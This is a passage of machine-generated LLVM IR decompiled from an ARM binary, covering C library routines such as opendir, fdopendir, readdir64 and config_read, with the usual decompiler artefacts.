  store i32 0, i32* %r3.global-to-local, align 4
  %v0_29848 = load i32, i32* @r4, align 4
  %v2_29848 = icmp ugt i32 %v0_29848, 511
  %v2_2984c = add i32 %v1_2982c, 4
  %v3_2984c = inttoptr i32 %v2_2984c to i32*
  store i32 0, i32* %v3_2984c, align 4
  %v0_29850 = load i32, i32* %r3.global-to-local, align 4
  %v2_29850 = add i32 %v1_2982c, 16
  %v3_29850 = inttoptr i32 %v2_29850 to i32*
  store i32 %v0_29850, i32* %v3_29850, align 4
  %v0_29854 = load i32, i32* %r3.global-to-local, align 4
  %v2_29854 = add i32 %v1_2982c, 8
  %v3_29854 = inttoptr i32 %v2_29854 to i32*
  store i32 %v0_29854, i32* %v3_29854, align 4
  br i1 %v2_29848, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_29844
  %v0_2985c2 = load i32, i32* @r4, align 4
  %v2_2985c3 = add i32 %v1_2982c, 20
  %v3_2985c4 = inttoptr i32 %v2_2985c3 to i32*
  store i32 %v0_2985c2, i32* %v3_2985c4, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_29844
  %v1_29858 = load i32, i32* %r3.global-to-local, align 4
  %v2_29858 = add i32 %v1_29858, 512
  store i32 %v2_29858, i32* %r3.global-to-local, align 4
  %v0_2985c = load i32, i32* @r4, align 4
  %v2_2985c = add i32 %v1_2982c, 20
  %v3_2985c = inttoptr i32 %v2_2985c to i32*
  store i32 %v0_2985c, i32* %v3_2985c, align 4
  %v1_29860 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_29860, i32* %v3_2985c, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v1_2982c, i32* @r5, align 4
  %v0_29868 = load i32, i32* @r7, align 4
  %v2_29868 = inttoptr i32 %v1_2982c to i32*
  store i32 %v0_29868, i32* %v2_29868, align 4
  %v0_2986c = load i32, i32* @r5, align 4
  %v1_2986c = add i32 %v0_2986c, 20
  %v2_2986c = inttoptr i32 %v1_2986c to i32*
  %v3_2986c = load i32, i32* %v2_2986c, align 4
  store i32 %v3_2986c, i32* %r1.global-to-local, align 4
  %v2_29874 = call i32 @calloc(i32 1, i32 %v3_2986c)
  %v2_29878 = icmp eq i32 %v2_29874, 0
  store i32 %v2_29874, i32* @r4, align 4
  %v1_29880 = load i32, i32* @r5, align 4
  %v2_29880 = add i32 %v1_29880, 12
  %v3_29880 = inttoptr i32 %v2_29880 to i32*
  store i32 %v2_29874, i32* %v3_29880, align 4
  br i1 %v2_29878, label %dec_label_pc_29888, label %dec_label_pc_29898

dec_label_pc_29888:                               ; preds = %bb17
  %v0_29888 = load i32, i32* @r5, align 4
  store i32 %v0_29888, i32* @r0, align 4
  %v0_2988c = call i32 @free()
  %v0_29890 = load i32, i32* @r4, align 4
  br label %dec_label_pc_298d0

dec_label_pc_29898:                               ; preds = %bb17
  %v0_2989c = load i32, i32* @r6, align 4
  %v2_2989c = add i32 %v0_2989c, -33400
  store i32 %v2_2989c, i32* %r3.global-to-local, align 4
  %v1_298a4 = inttoptr i32 %v2_2989c to i32*
  %v2_298a4 = load i32, i32* %v1_298a4, align 4
  %v3_298a4 = add i32 %v0_2989c, -33396
  %v4_298a4 = inttoptr i32 %v3_298a4 to i32*
  %v5_298a4 = load i32, i32* %v4_298a4, align 4
  store i32 %v5_298a4, i32* %r1.global-to-local, align 4
  %v6_298a4 = add i32 %v0_2989c, -33392
  %v7_298a4 = inttoptr i32 %v6_298a4 to i32*
  %v8_298a4 = load i32, i32* %v7_298a4, align 4
  store i32 %v8_298a4, i32* %r2.global-to-local, align 4
  %v9_298a4 = add i32 %v0_2989c, -33388
  %v10_298a4 = inttoptr i32 %v9_298a4 to i32*
  %v11_298a4 = load i32, i32* %v10_298a4, align 4
  store i32 %v11_298a4, i32* %r3.global-to-local, align 4
  %v12_298a4 = add i32 %v0_2989c, -33384
  %v1_298b0 = inttoptr i32 %v12_298a4 to i32*
  %v2_298b0 = load i32, i32* %v1_298b0, align 4
  %v3_298b0 = add i32 %v0_2989c, -33380
  %v4_298b0 = inttoptr i32 %v3_298b0 to i32*
  %v5_298b0 = load i32, i32* %v4_298b0, align 4
  store i32 %v2_298b0, i32* %stack_var_-32, align 4
  store i32 %v5_298a4, i32* %r1.global-to-local, align 4
  store i32 %v8_298a4, i32* %r2.global-to-local, align 4
  store i32 %v11_298a4, i32* %r3.global-to-local, align 4
  %v0_298c0 = load i32, i32* @r5, align 4
  %v1_298c0 = add i32 %v0_298c0, 24
  %v1_298c4 = inttoptr i32 %v1_298c0 to i32*
  store i32 %v2_298a4, i32* %v1_298c4, align 4
  %v3_298c4 = add i32 %v0_298c0, 28
  %v4_298c4 = inttoptr i32 %v3_298c4 to i32*
  %v5_298c4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_298c4, i32* %v4_298c4, align 4
  %v6_298c4 = add i32 %v0_298c0, 32
  %v7_298c4 = inttoptr i32 %v6_298c4 to i32*
  %v8_298c4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_298c4, i32* %v7_298c4, align 4
  %v9_298c4 = add i32 %v0_298c0, 36
  %v10_298c4 = inttoptr i32 %v9_298c4 to i32*
  %v11_298c4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_298c4, i32* %v10_298c4, align 4
  %v12_298c4 = add i32 %v0_298c0, 40
  %v2_298c8 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_298b0, i32* %r1.global-to-local, align 4
  %v1_298cc = inttoptr i32 %v12_298c4 to i32*
  store i32 %v2_298c8, i32* %v1_298cc, align 4
  %v3_298cc = add i32 %v0_298c0, 44
  %v4_298cc = inttoptr i32 %v3_298cc to i32*
  %v5_298cc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_298cc, i32* %v4_298cc, align 4
  %v0_298d0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_298d0

dec_label_pc_298d0:                               ; preds = %bb, %dec_label_pc_29888, %dec_label_pc_29898
  %v0_298d0 = phi i32 [ 0, %bb ], [ %v0_29890, %dec_label_pc_29888 ], [ %v0_298d0.pre, %dec_label_pc_29898 ]
  store i32 %v12_29818, i32* @r7, align 4
  ret i32 %v0_298d0

; uselistorder directives
  uselistorder i32 %v2_29874, { 1, 0, 2 }
  uselistorder i32 %v1_2982c, { 2, 1, 6, 0, 4, 5, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_298d0, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  store i32 542720, i32* %r1.global-to-local, align 4
  %v2_298f0 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp6 = icmp ult i32 %arg1, -4095
  br i1 %tmp6, label %dec_label_pc_29920, label %dec_label_pc_29908

dec_label_pc_29908:                               ; preds = %entry
  %v0_2990c = call i32 @__aeabi_read_tp()
  %v3_29910 = load i16, i16* @global_var_42934.3040, align 2
  %v4_29910 = sext i16 %v3_29910 to i32
  %v0_29914 = load i32, i32* %r2.global-to-local, align 4
  %v1_29914 = sub i32 0, %v0_29914
  store i32 %v1_29914, i32* %r2.global-to-local, align 4
  %v3_29918 = add i32 %v4_29910, %v0_2990c
  %v4_29918 = inttoptr i32 %v3_29918 to i32*
  store i32 %v1_29914, i32* %v4_29918, align 4
  br label %dec_label_pc_29944

dec_label_pc_29920:                               ; preds = %entry
  store i32 %arg1, i32* @r7, align 4
  %v1_29920 = icmp slt i32 %arg1, 0
  br i1 %v1_29920, label %dec_label_pc_29944, label %dec_label_pc_29928

dec_label_pc_29928:                               ; preds = %dec_label_pc_29920
  store i32 %v2_298f0, i32* @r1, align 4
  %v0_2992c = call i32 @fstat()
  %v1_29930 = icmp slt i32 %v0_2992c, 0
  br i1 %v1_29930, label %dec_label_pc_29938, label %dec_label_pc_2994c

dec_label_pc_29938:                               ; preds = %dec_label_pc_29928
  br label %dec_label_pc_29944

dec_label_pc_29944:                               ; preds = %dec_label_pc_29938, %dec_label_pc_29920, %dec_label_pc_29908
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_29990

dec_label_pc_2994c:                               ; preds = %dec_label_pc_29928
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_29954 = load i32, i32* @r7, align 4
  %v3_29958 = call i32 @__GI___fcntl_nocancel(i32 %v0_29954, i32 2, i32 1)
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_29960 = load i32, i32* @r7, align 4
  %v2_29964 = call i32 @fd_to_DIR(i32 %v0_29960, i32 %tmp)
  store i32 %v2_29964, i32* %r1.global-to-local, align 4
  %v2_29968 = icmp eq i32 %v2_29964, 0
  br i1 %v2_29968, label %dec_label_pc_29970, label %dec_label_pc_29990

dec_label_pc_29970:                               ; preds = %dec_label_pc_2994c
  %v0_29980 = call i32 @__aeabi_read_tp()
  %v3_29984 = load i16, i16* @global_var_42934.3040, align 2
  %v4_29984 = sext i16 %v3_29984 to i32
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_2998c = add i32 %v4_29984, %v0_29980
  %v4_2998c = inttoptr i32 %v3_2998c to i32*
  store i32 12, i32* %v4_2998c, align 4
  %v0_29990.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_29990

dec_label_pc_29990:                               ; preds = %dec_label_pc_2994c, %dec_label_pc_29944, %dec_label_pc_29970
  %v0_29990 = phi i32 [ %v2_29964, %dec_label_pc_2994c ], [ 0, %dec_label_pc_29944 ], [ %v0_29990.pre, %dec_label_pc_29970 ]
  ret i32 %v0_29990

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_29990, { 2, 0, 1 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_299a0:
  %v0_299a0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_299a0, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_299a0
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_299a0, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @fdopendir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_299b0 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_299b0, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_299bc = call i32 @fstat()
  store i32 %v0_299bc, i32* @r5, align 4
  %v2_299c0 = icmp eq i32 %v0_299bc, 0
  br i1 %v2_299c0, label %dec_label_pc_299c8, label %dec_label_pc_29a40

dec_label_pc_299c8:                               ; preds = %entry
  %v1_299cc = and i32 %tmp4, 61440
  store i32 %v1_299cc, i32* @r3, align 4
  %v7_299d0 = icmp eq i32 %v1_299cc, 16384
  br i1 %v7_299d0, label %dec_label_pc_299f0, label %dec_label_pc_299d8

dec_label_pc_299d8:                               ; preds = %dec_label_pc_299c8
  %v0_299dc = call i32 @__aeabi_read_tp()
  %v3_299e0 = load i16, i16* @global_var_42934.3040, align 2
  %v0_299e4 = load i32, i32* @r5, align 4
  store i32 %v0_299e4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_29a24

dec_label_pc_299f0:                               ; preds = %dec_label_pc_299c8
  %v0_299f0 = load i32, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_299f8 = call i32 @__libc_fcntl(i32 %v0_299f0, i32 3)
  %v7_299fc = icmp eq i32 %v2_299f8, -1
  br i1 %v7_299fc, label %dec_label_pc_29a40, label %dec_label_pc_29a04

dec_label_pc_29a04:                               ; preds = %dec_label_pc_299f0
  %v1_29a04 = urem i32 %v2_299f8, 4
  store i32 %v1_29a04, i32* %r3.global-to-local, align 4
  %v7_29a08 = icmp eq i32 %v1_29a04, 1
  br i1 %v7_29a08, label %dec_label_pc_29a10, label %dec_label_pc_29a2c

dec_label_pc_29a10:                               ; preds = %dec_label_pc_29a04
  %v0_29a14 = call i32 @__aeabi_read_tp()
  %v3_29a18 = load i16, i16* @global_var_42934.3040, align 2
  %v0_29a1c = load i32, i32* @r5, align 4
  store i32 %v0_29a1c, i32* %r1.global-to-local, align 4
  %v0_29a20 = load i32, i32* %r3.global-to-local, align 4
  %v1_29a20 = add i32 %v0_29a20, 21
  br label %dec_label_pc_29a24

dec_label_pc_29a24:                               ; preds = %dec_label_pc_299d8, %dec_label_pc_29a10
  %v2_29a24.in = phi i16 [ %v3_299e0, %dec_label_pc_299d8 ], [ %v3_29a18, %dec_label_pc_29a10 ]
  %v1_29a24 = phi i32 [ %v0_299dc, %dec_label_pc_299d8 ], [ %v0_29a14, %dec_label_pc_29a10 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_299d8 ], [ %v1_29a20, %dec_label_pc_29a10 ]
  %v2_29a24 = sext i16 %v2_29a24.in to i32
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v3_29a24 = add i32 %v1_29a24, %v2_29a24
  %v4_29a24 = inttoptr i32 %v3_29a24 to i32*
  store i32 %storemerge, i32* %v4_29a24, align 4
  %v0_29a44.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_29a44

dec_label_pc_29a2c:                               ; preds = %dec_label_pc_29a04
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_29a30 = load i32, i32* @r4, align 4
  %v2_29a34 = call i32 @fd_to_DIR(i32 %v0_29a30, i32 %tmp)
  store i32 %v2_29a34, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_29a44

dec_label_pc_29a40:                               ; preds = %entry, %dec_label_pc_299f0
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_29a44

dec_label_pc_29a44:                               ; preds = %dec_label_pc_29a2c, %dec_label_pc_29a24, %dec_label_pc_29a40
  %v0_29a44 = phi i32 [ %v2_29a34, %dec_label_pc_29a2c ], [ %v0_29a44.pre, %dec_label_pc_29a24 ], [ 0, %dec_label_pc_29a40 ]
  ret i32 %v0_29a44

; uselistorder directives
  uselistorder i32 %v1_29a04, { 1, 0 }
  uselistorder i32 %v2_299f8, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 7, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 21, { 1, 0, 3, 2 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_29a44, { 2, 0, 1 }
  uselistorder label %dec_label_pc_29a40, { 1, 0 }
  uselistorder label %dec_label_pc_29a24, { 1, 0 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r6, align 4
  %v1_29a70 = add i32 %tmp, 24
  store i32 %v1_29a70, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_29a88 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 124) to i32*), align 4
  store i32 %v4_29a88, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_29a88)
  %v0_29a9c = load i32, i32* @r6, align 4
  %v2_29a9c = add i32 %v0_29a9c, 20
  %v3_29a9c = inttoptr i32 %v2_29a9c to i32*
  %v4_29a9c = load i32, i32* %v3_29a9c, align 4
  store i32 %v4_29a9c, i32* %ip.global-to-local, align 4
  store i32 170664, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_29a9c)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_29aac

dec_label_pc_29aac:                               ; preds = %dec_label_pc_29adc, %entry
  %v0_29aac = load i32, i32* @r5, align 4
  %v1_29aac = add i32 %v0_29aac, 4
  %v2_29aac = inttoptr i32 %v1_29aac to i32*
  %v3_29aac = load i32, i32* %v2_29aac, align 4
  %v4_29aac = add i32 %v0_29aac, 8
  %v5_29aac = inttoptr i32 %v4_29aac to i32*
  %v6_29aac = load i32, i32* %v5_29aac, align 4
  %tmp10 = icmp ugt i32 %v6_29aac, %v3_29aac
  br i1 %tmp10, label %dec_label_pc_29adc, label %dec_label_pc_29ab8

dec_label_pc_29ab8:                               ; preds = %dec_label_pc_29aac
  %v1_29ab8 = inttoptr i32 %v0_29aac to i32*
  %v2_29ab8 = load i32, i32* %v1_29ab8, align 4
  %v1_29abc = add i32 %v0_29aac, 12
  %v2_29abc = inttoptr i32 %v1_29abc to i32*
  %v3_29abc = load i32, i32* %v2_29abc, align 4
  %v1_29ac0 = add i32 %v0_29aac, 20
  %v2_29ac0 = inttoptr i32 %v1_29ac0 to i32*
  %v3_29ac0 = load i32, i32* %v2_29ac0, align 4
  %v4_29ac4 = inttoptr i32 %v3_29abc to i32*
  %v5_29ac4 = call i32 @__getdents64(i32 %v2_29ab8, i32* %v4_29ac4, i32 %v3_29ac0, i32 %v6_29aac)
  %tmp9 = icmp slt i32 %v5_29ac4, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_29ad4

.thread:                                          ; preds = %dec_label_pc_29ab8
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_29b0c

dec_label_pc_29ad4:                               ; preds = %dec_label_pc_29ab8
  %v1_29ad4 = load i32, i32* @r5, align 4
  %v2_29ad4 = add i32 %v1_29ad4, 8
  %v3_29ad4 = inttoptr i32 %v2_29ad4 to i32*
  store i32 %v5_29ac4, i32* %v3_29ad4, align 4
  %v0_29ad8 = load i32, i32* @r7, align 4
  %v1_29ad8 = load i32, i32* @r5, align 4
  %v2_29ad8 = add i32 %v1_29ad8, 4
  %v3_29ad8 = inttoptr i32 %v2_29ad8 to i32*
  store i32 %v0_29ad8, i32* %v3_29ad8, align 4
  %v0_29adc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_29adc

dec_label_pc_29adc:                               ; preds = %dec_label_pc_29aac, %dec_label_pc_29ad4
  %v1_29b00 = phi i32 [ %v0_29aac, %dec_label_pc_29aac ], [ %v0_29adc.pre, %dec_label_pc_29ad4 ]
  %v1_29adc = add i32 %v1_29b00, 4
  %v2_29adc = inttoptr i32 %v1_29adc to i32*
  %v3_29adc = load i32, i32* %v2_29adc, align 4
  %v1_29ae0 = add i32 %v1_29b00, 12
  %v2_29ae0 = inttoptr i32 %v1_29ae0 to i32*
  %v3_29ae0 = load i32, i32* %v2_29ae0, align 4
  %v2_29ae4 = add i32 %v3_29ae0, %v3_29adc
  store i32 %v2_29ae4, i32* @r4, align 4
  %v3_29ae8 = inttoptr i32 %v2_29ae4 to i32*
  %v4_29ae8 = load i32, i32* %v3_29ae8, align 4
  %v1_29aec = add i32 %v2_29ae4, 4
  %v2_29aec = inttoptr i32 %v1_29aec to i32*
  %v3_29aec = load i32, i32* %v2_29aec, align 4
  %v1_29af0 = add i32 %v2_29ae4, 16
  %v2_29af0 = inttoptr i32 %v1_29af0 to i16*
  %v3_29af0 = load i16, i16* %v2_29af0, align 2
  %v4_29af0 = zext i16 %v3_29af0 to i32
  %v1_29af4 = add i32 %v2_29ae4, 8
  %v2_29af4 = inttoptr i32 %v1_29af4 to i32*
  %v3_29af4 = load i32, i32* %v2_29af4, align 4
  store i32 %v3_29af4, i32* %ip.global-to-local, align 4
  %v2_29af8 = add i32 %v4_29af0, %v3_29adc
  %v2_29afc = or i32 %v3_29aec, %v4_29ae8
  %v4_29afc = icmp eq i32 %v2_29afc, 0
  store i32 %v2_29af8, i32* %v2_29adc, align 4
  %v0_29b04 = load i32, i32* %ip.global-to-local, align 4
  %v1_29b04 = load i32, i32* @r5, align 4
  %v2_29b04 = add i32 %v1_29b04, 16
  %v3_29b04 = inttoptr i32 %v2_29b04 to i32*
  store i32 %v0_29b04, i32* %v3_29b04, align 4
  br i1 %v4_29afc, label %dec_label_pc_29aac, label %dec_label_pc_29b0c

dec_label_pc_29b0c:                               ; preds = %dec_label_pc_29adc, %.thread
  %v0_29b18 = load i32, i32* @r6, align 4
  %v2_29b18 = add i32 %v0_29b18, 52
  %v3_29b18 = inttoptr i32 %v2_29b18 to i32*
  %v4_29b18 = load i32, i32* %v3_29b18, align 4
  store i32 %v4_29b18, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_29b18)
  %v0_29b24 = load i32, i32* @r4, align 4
  ret i32 %v0_29b24

; uselistorder directives
  uselistorder i32 %v2_29ae4, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_29b00, { 1, 0 }
  uselistorder i32 %v6_29aac, { 1, 0 }
  uselistorder i32 %v0_29aac, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_29adc, { 1, 0 }
}

define i32 @function_29b38(i32 %arg1) local_unnamed_addr {
dec_label_pc_29b38:
  %v0_29b38 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_29b38, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_29b38
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_29b38, %bb
  %v10_29b44 = phi i32 [ %arg1, %dec_label_pc_29b38 ], [ 0, %bb ]
  ret i32 %v10_29b44

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_29b48 = load i32, i32* @r4, align 4
  %v6_29b48 = load i32, i32* @r5, align 4
  %v9_29b48 = load i32, i32* @r6, align 4
  %v12_29b48 = load i32, i32* @r7, align 4
  %v15_29b48 = load i32, i32* @r8, align 4
  %v18_29b48 = load i32, i32* @sb, align 4
  %v21_29b48 = load i32, i32* @sl, align 4
  %v24_29b48 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_29b4c = icmp eq i32* %arg1, null
  store i1 %v2_29b4c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_29b4c, label %dec_label_pc_29e5c, label %dec_label_pc_29b64

dec_label_pc_29b64:                               ; preds = %entry
  %v1_29b64 = urem i32 %arg3, 256
  store i32 %v1_29b64, i32* @sb, align 4
  %v1_29b68 = udiv i32 %arg3, 256
  %v3_29b6c = urem i32 %v1_29b68, 256
  %v3_29b70 = mul nuw nsw i32 %v1_29b64, 4
  %v1_29b78 = or i32 %v3_29b70, 1
  %v1_29b84 = and i32 %arg3, 131072
  %v1_29b88 = add nsw i32 %v1_29b64, -1
  %v1_29b94 = and i32 %arg3, 262144
  store i32 %v1_29b94, i32* %r2.global-to-local, align 4
  %v1_29b98 = and i32 %arg3, 65536
  store i32 %v1_29b98, i32* %r3.global-to-local, align 4
  store i32 %v1_29b98, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_29ba8 = add i32 %arg4, 1
  store i32 %v1_29ba8, i32* @sl, align 4
  %v2_29d20 = icmp eq i32 %v1_29b84, 0
  %v1_29d78 = inttoptr i32 %arg2 to i32*
  %v2_29d90 = icmp eq i32 %v1_29b94, 0
  br label %dec_label_pc_29bac

dec_label_pc_29bac:                               ; preds = %dec_label_pc_29bac.backedge, %dec_label_pc_29b64
  %v2_29bc8 = phi i32 [ %v0_29bac.pre, %dec_label_pc_29bac.backedge ], [ %tmp, %dec_label_pc_29b64 ]
  %v1_29bac = add i32 %v2_29bc8, 4
  %v2_29bac = inttoptr i32 %v1_29bac to i32*
  %v3_29bac = load i32, i32* %v2_29bac, align 4
  store i32 %v3_29bac, i32* %r3.global-to-local, align 4
  %v2_29bb0 = icmp eq i32 %v3_29bac, 0
  store i1 %v2_29bb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_29bb0, label %dec_label_pc_29bb8, label %dec_label_pc_29c00

dec_label_pc_29bb8:                               ; preds = %dec_label_pc_29bac
  %v1_29bb8 = add i32 %v2_29bc8, 16
  %v2_29bb8 = inttoptr i32 %v1_29bb8 to i32*
  %v3_29bb8 = load i32, i32* %v2_29bb8, align 4
  store i32 %v3_29bb8, i32* %r3.global-to-local, align 4
  %v2_29bbc = icmp eq i32 %v3_29bb8, 0
  store i1 %v2_29bbc, i1* %cpsr_z.global-to-local, align 1
  %v1_29bc0 = add i32 %v2_29bc8, 8
  %v2_29bc0 = inttoptr i32 %v1_29bc0 to i32*
  %v3_29bc0 = load i32, i32* %v2_29bc0, align 4
  store i32 %v3_29bc0, i32* %r3.global-to-local, align 4
  br i1 %v2_29bbc, label %bb, label %bb64

bb:                                               ; preds = %dec_label_pc_29bb8
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_29bb8, align 4
  %v0_29bcc.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_29bb8, %bb
  %v0_29bcc = phi i32 [ %v0_29bcc.pre, %bb ], [ %v3_29bc0, %dec_label_pc_29bb8 ]
  %v2_29bcc = icmp eq i32 %v0_29bcc, 0
  store i1 %v2_29bcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_29bcc, label %bb65, label %.thread

bb65:                                             ; preds = %bb64
  store i32 %v1_29b78, i32* %r3.global-to-local, align 4
  %v2_29bd4 = load i32, i32* @r5, align 4
  %v3_29bd4 = add i32 %v2_29bd4, 8
  %v4_29bd4 = inttoptr i32 %v3_29bd4 to i32*
  store i32 %v1_29b78, i32* %v4_29bd4, align 4
  br label %.thread

.thread:                                          ; preds = %bb64, %bb65
  %v0_29bd8 = load i32, i32* @r5, align 4
  %v1_29bd8 = add i32 %v0_29bd8, 16
  %v2_29bd8 = inttoptr i32 %v1_29bd8 to i32*
  %v3_29bd8 = load i32, i32* %v2_29bd8, align 4
  store i32 %v3_29bd8, i32* %r0.global-to-local, align 4
  %v1_29bdc = add i32 %v0_29bd8, 8
  %v2_29bdc = inttoptr i32 %v1_29bdc to i32*
  %v3_29bdc = load i32, i32* %v2_29bdc, align 4
  store i32 %v3_29bdc, i32* %r3.global-to-local, align 4
  %v2_29be0 = add i32 %v3_29bdc, %v3_29bd8
  store i32 %v2_29be0, i32* %r0.global-to-local, align 4
  %v1_29be4 = call i32 @malloc(i32 %v2_29be0)
  store i32 %v1_29be4, i32* %r0.global-to-local, align 4
  %v2_29be8 = icmp eq i32 %v1_29be4, 0
  store i1 %v2_29be8, i1* %cpsr_z.global-to-local, align 1
  %v1_29bec = load i32, i32* @r5, align 4
  %v2_29bec = add i32 %v1_29bec, 4
  %v3_29bec = inttoptr i32 %v2_29bec to i32*
  store i32 %v1_29be4, i32* %v3_29bec, align 4
  br i1 %v2_29be8, label %dec_label_pc_29e5c, label %dec_label_pc_29bf4

dec_label_pc_29bf4:                               ; preds = %.thread
  %v0_29bf4 = load i32, i32* @r5, align 4
  %v1_29bf4 = add i32 %v0_29bf4, 20
  %v2_29bf4 = inttoptr i32 %v1_29bf4 to i32*
  %v3_29bf4 = load i32, i32* %v2_29bf4, align 4
  %v1_29bf8 = or i32 %v3_29bf4, 1
  store i32 %v1_29bf8, i32* %r3.global-to-local, align 4
  store i32 %v1_29bf8, i32* %v2_29bf4, align 4
  %v0_29c00.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_29c00

dec_label_pc_29c00:                               ; preds = %dec_label_pc_29bac, %dec_label_pc_29bf4
  %v1_29c08 = phi i32 [ %v2_29bc8, %dec_label_pc_29bac ], [ %v0_29c00.pre, %dec_label_pc_29bf4 ]
  %v1_29c00 = add i32 %v1_29c08, 4
  %v2_29c00 = inttoptr i32 %v1_29c00 to i32*
  %v3_29c00 = load i32, i32* %v2_29c00, align 4
  store i32 %v3_29c00, i32* %r2.global-to-local, align 4
  %v4_29c00 = add i32 %v1_29c08, 8
  %v5_29c00 = inttoptr i32 %v4_29c00 to i32*
  %v6_29c00 = load i32, i32* %v5_29c00, align 4
  %v2_29c04 = add i32 %v6_29c00, %v3_29c00
  store i32 %v2_29c04, i32* %r3.global-to-local, align 4
  %v2_29c08 = add i32 %v1_29c08, 12
  %v3_29c08 = inttoptr i32 %v2_29c08 to i32*
  store i32 %v2_29c04, i32* %v3_29c08, align 4
  %v0_29c0c = load i32, i32* @fp, align 4
  store i32 %v0_29c0c, i32* @r6, align 4
  br label %dec_label_pc_29c10

